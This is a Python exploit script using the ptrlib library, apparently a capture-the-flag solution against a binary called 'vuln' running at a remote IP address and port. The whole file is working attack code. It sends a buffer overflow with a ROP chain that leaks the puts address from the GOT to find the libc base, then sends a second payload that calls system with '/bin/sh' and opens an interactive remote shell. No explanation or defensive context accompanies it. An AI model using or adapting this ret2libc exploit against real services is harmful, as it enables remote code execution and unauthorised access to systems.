from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./vuln")
#sock = Process("./vuln")
sock = Socket("35.188.73.186", 1111)
rop_pop_rdi = 0x00401223

payload = b'A' * 0x108
payload += p64(rop_pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(elf.plt("puts"))
payload += p64(elf.symbol("_start"))
sock.recvline()
sock.send(payload)
sock.recvline()
libc_base = u64(sock.recvline()) - libc.symbol("puts")
logger.info("libc base = " + hex(libc_base))

payload = b'A' * 0x108
payload += p64(rop_pop_rdi + 1)
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.recvline()
sock.send(payload)
sock.recvline()

sock.interactive()
